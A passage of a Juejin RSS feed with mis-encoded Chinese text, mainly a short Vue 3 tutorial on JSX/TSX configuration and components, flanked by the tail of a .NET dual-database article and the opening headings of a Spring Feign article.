<li>ğŸ“± <strong>IoT è¾¹ç¼˜è®¾å¤‡ + äº‘ä¸­å¿ƒ</strong>ï¼šè®¾å¤‡ç”¨ SQLite è®°å½•æœ¬åœ°çŠ¶æ€ï¼Œå®šæœŸåŒæ­¥åˆ°äº‘ç«¯ PostgreSQLï¼›</li>
<li>ğŸ–¥ï¸ <strong>æ¡Œé¢åº”ç”¨</strong>ï¼šé…ç½®ã€ç¼“å­˜ç”¨ SQLiteï¼Œç”¨æˆ·æ•°æ®åŒæ­¥åˆ° PostgreSQLï¼›</li>
<li>ğŸ§ª <strong>æµ‹è¯•éš”ç¦»</strong>ï¼šé›†æˆæµ‹è¯•æ—¶ç”¨ SQLite æ›¿ä»£ PostgreSQLï¼ŒåŠ é€Ÿæ‰§è¡Œã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-14">ç»“è¯­</h3>
<p>åœ¨ .NET Core ä¸­èåˆ PostgreSQL ä¸ SQLiteï¼Œå¹¶éâ€œç‚«æŠ€â€ï¼Œè€Œæ˜¯å¯¹<strong>åœºæ™¯é€‚é…æ€§</strong>çš„ç†æ€§é€‰æ‹©ã€‚é€šè¿‡æ¸…æ™°çš„æ¶æ„åˆ†å±‚ã€ç‹¬ç«‹çš„ DbContext è®¾è®¡å’Œåˆç†çš„æœåŠ¡æ³¨å…¥ï¼Œæˆ‘ä»¬æ—¢èƒ½äº«å— PostgreSQL çš„ä¼ä¸šçº§èƒ½åŠ›ï¼Œåˆèƒ½åˆ©ç”¨ SQLite çš„æè‡´è½»é‡ã€‚</p>
<p>åŒåº“ååŒï¼Œä¸æ˜¯å¦¥åï¼Œè€Œæ˜¯æ™ºæ…§â€”â€”è®©æ¯ä¸€ä»½æ•°æ®ï¼Œéƒ½è½åœ¨æœ€é€‚åˆå®ƒçš„åœŸå£¤ä¸Šã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue3ä½¿ç”¨jsxè¯­æ³•è¯¦è§£]]></title>    <link>https://juejin.cn/post/7603651855236481033</link>    <guid>https://juejin.cn/post/7603651855236481033</guid>    <pubDate>2026-02-08T03:38:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603651855236481033" data-draft-id="7603627478021488650" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue3ä½¿ç”¨jsxè¯­æ³•è¯¦è§£"/> <meta itemprop="keywords" content="Vue.js,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-08T03:38:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜Ÿå…‰ä¸é—®èµ¶è·¯äºº"/> <meta itemprop="url" content="https://juejin.cn/user/950397121075304"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue3ä½¿ç”¨jsxè¯­æ³•è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/950397121075304/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜Ÿå…‰ä¸é—®èµ¶è·¯äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T03:38:05.000Z" title="Sun Feb 08 2026 03:38:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è™½ç„¶æœ€æ—©æ˜¯ç”± React å¼•å…¥ï¼Œä½†å®é™…ä¸Š JSX è¯­æ³•å¹¶æ²¡æœ‰å®šä¹‰è¿è¡Œæ—¶è¯­ä¹‰ï¼Œå¹¶ä¸”èƒ½è¢«ç¼–è¯‘æˆå„ç§ä¸åŒçš„è¾“å‡ºå½¢å¼ã€‚å¦‚æœä½ ä¹‹å‰ä½¿ç”¨è¿‡ JSX è¯­æ³•ï¼Œé‚£ä¹ˆè¯·æ³¨æ„Â <strong>Vue çš„ JSX è½¬æ¢æ–¹å¼ä¸ React ä¸­ JSX çš„è½¬æ¢æ–¹å¼ä¸åŒ</strong>ï¼Œå› æ­¤ä½ ä¸èƒ½åœ¨ Vue åº”ç”¨ä¸­ä½¿ç”¨ React çš„ JSX è½¬æ¢ã€‚ä¸ React JSX è¯­æ³•çš„ä¸€äº›æ˜æ˜¾åŒºåˆ«åŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯ä»¥ä½¿ç”¨ HTML attributes æ¯”å¦‚Â <code>class</code>Â å’ŒÂ <code>for</code>Â ä½œä¸º props - ä¸éœ€è¦ä½¿ç”¨Â <code>className</code>Â æˆ–Â <code>htmlFor</code>ã€‚</li>
<li>ä¼ é€’å­å…ƒç´ ç»™ç»„ä»¶ (æ¯”å¦‚ slots) çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Fextras%2Frender-function.html%23passing-slots" target="_blank" title="https://cn.vuejs.org/guide/extras/render-function.html#passing-slots" ref="nofollow noopener noreferrer">æ–¹å¼ä¸åŒ</a>ã€‚</li>
</ul>
<h2 data-id="heading-0">æ·»åŠ çš„é…ç½®</h2>
<h3 data-id="heading-1">1ï¸âƒ£ tsconfig</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"jsx"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"preserve"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"jsxImportSource"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"vue"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-2">2ï¸âƒ£ vite.config.ts</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>
<span class="hljs-keyword">import</span> vueJsx <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue-jsx'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">vue</span>(), <span class="hljs-title function_">vueJsx</span>()]
}
</code></pre>
<h2 data-id="heading-3">ä»£ç æ¼”ç¤º</h2>
<p>åœ¨ <strong>vueæ–‡ä»¶</strong> ä¸­</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"tsx"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { computed, defineComponent, ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

<span class="hljs-comment">// 1. å®šä¹‰ä¸€ä¸ª JSX ç‰‡æ®µæˆ–å°ç»„ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">RenderHeader</span> = (<span class="hljs-params"/>) =&gt; (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>è¿™æ˜¯ JSX æ¸²æŸ“çš„æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰è®¡æ•°: {count.value}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span>
)

<span class="hljs-comment">// 2. è¿™æ˜¯ä¸€ä¸ªè¿”å› VNode çš„è®¡ç®—å±æ€§ã€‚æ­é… component ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> renderContent = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> count.<span class="hljs-property">value</span> &gt; <span class="hljs-number">5</span> ? (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>å·²è¾¾åˆ°ä¸Šé™<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  ) : (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> count.value++}&gt;å¢åŠ <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  )
})

<span class="hljs-comment">// 3. æ™®é€šç»„ä»¶, setupè¿”å›ä¸€ä¸ªæ¸²æŸ“å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Bbb</span> = <span class="hljs-title function_">defineComponent</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Bbb'</span>,
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>11111<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  },
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">RenderHeader</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"renderContent"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Bbb</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<blockquote>
<p>æ³¨æ„ï¼š<code>lang</code>çš„å€¼æ˜¯ tsx</p>
</blockquote>
<p>åœ¨ <strong>tsxæ–‡ä»¶</strong> ä¸­</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å‡½æ•°å¼ç»„ä»¶</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> () =&gt; {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">{styles.name}</span>&gt;</span>hello world<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">Aaa</span> = <span class="hljs-title function_">defineComponent</span>({
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">ref</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>())
    <span class="hljs-comment">// è¿”å›æ¸²æŸ“å‡½æ•°</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>aaa {t.value}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  },
})
</code></pre>
<h2 data-id="heading-4"><strong>æ ·å¼æ–¹æ¡ˆé€‰å‹</strong></h2>
<p>ä½¿ç”¨ JSX/TSXï¼Œ<strong>CSS Modules</strong> æˆ– <strong>Tailwind CSS</strong> æ˜¯æ›´å¥½çš„æ­æ¡£ã€‚Scoped CSS æ˜¯ä¸“ä¸º Template è®¾è®¡çš„ã€‚</p>
<p>åœ¨ vueæ–‡ä»¶ ä¸­ï¼Œä½¿ç”¨ CSS Modules</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">module</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.header</span> {
  <span class="hljs-attribute">color</span>: blue;
}

<span class="hljs-selector-class">.content</span> {
  <span class="hljs-attribute">color</span>: green;
}

<span class="hljs-selector-class">.bbb</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-5">eslint</h2>
<p>è¦åœ¨ vueæ–‡ä»¶ ä¸­ä½¿ç”¨tsxï¼Œåº”æ·»åŠ  <code>configureVueProject</code> çš„é…ç½®</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">configureVueProject</span>({ <span class="hljs-attr">scriptLangs</span>: [<span class="hljs-string">'ts'</span>, <span class="hljs-string">'tsx'</span>] })

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfigWithVueTs</span>(
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'app/files-to-lint'</span>,
    <span class="hljs-attr">files</span>: [<span class="hljs-string">'**/*.{ts,mts,tsx,vue}'</span>],
  },

  <span class="hljs-title function_">globalIgnores</span>([<span class="hljs-string">'**/dist/**'</span>, <span class="hljs-string">'**/dist-ssr/**'</span>, <span class="hljs-string">'**/coverage/**'</span>]),

  pluginVue.<span class="hljs-property">configs</span>[<span class="hljs-string">'flat/essential'</span>],
  vueTsConfigs.<span class="hljs-property">recommended</span>,
  skipFormatting,
)
</code></pre>
<h2 data-id="heading-6">å‚è€ƒ</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Fextras%2Frender-function.html%23jsx-tsx" target="_blank" title="https://cn.vuejs.org/guide/extras/render-function.html#jsx-tsx" ref="nofollow noopener noreferrer">cn.vuejs.org/guide/extraâ€¦</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2F%40vue%2Feslint-config-typescript" target="_blank" title="https://www.npmjs.com/package/@vue/eslint-config-typescript" ref="nofollow noopener noreferrer">www.npmjs.com/package/@vuâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ«æ‰‹å†™HTTPè¯·æ±‚ï¼Spring Feign è°ƒç”¨åŸç†æ·±åº¦æ‹†è§£ï¼šä»æºç åˆ°å®æˆ˜ï¼Œä¸€ç¯‡ææ‡‚]]></title>    <link>https://juejin.cn/post/7604345576176828454</link>    <guid>https://juejin.cn/post/7604345576176828454</guid>    <pubDate>2026-02-09T07:48:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604345576176828454" data-draft-id="7604471065859932211" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ«æ‰‹å†™HTTPè¯·æ±‚ï¼Spring Feign è°ƒç”¨åŸç†æ·±åº¦æ‹†è§£ï¼šä»æºç åˆ°å®æˆ˜ï¼Œä¸€ç¯‡ææ‡‚"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-09T07:48:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥å¥‡å°æ±¤åœ†"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«æ‰‹å†™HTTPè¯·æ±‚ï¼Spring Feign è°ƒç”¨åŸç†æ·±åº¦æ‹†è§£ï¼šä»æºç åˆ°å®æˆ˜ï¼Œä¸€ç¯‡ææ‡‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥å¥‡å°æ±¤åœ†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T07:48:26.000Z" title="Mon Feb 09 2026 07:48:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»38åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>ä¸€ã€å¼•è¨€ï¼šå¾®æœåŠ¡è¿œç¨‹è°ƒç”¨çš„ â€œç—›ç‚¹â€ ä¸ Feign çš„ â€œæ•‘èµâ€</strong></h2>
<h3 data-id="heading-1"><strong>1.1 å¾®æœåŠ¡è¿œç¨‹è°ƒç”¨çš„å¸¸è§å›°å¢ƒ</strong></h3>
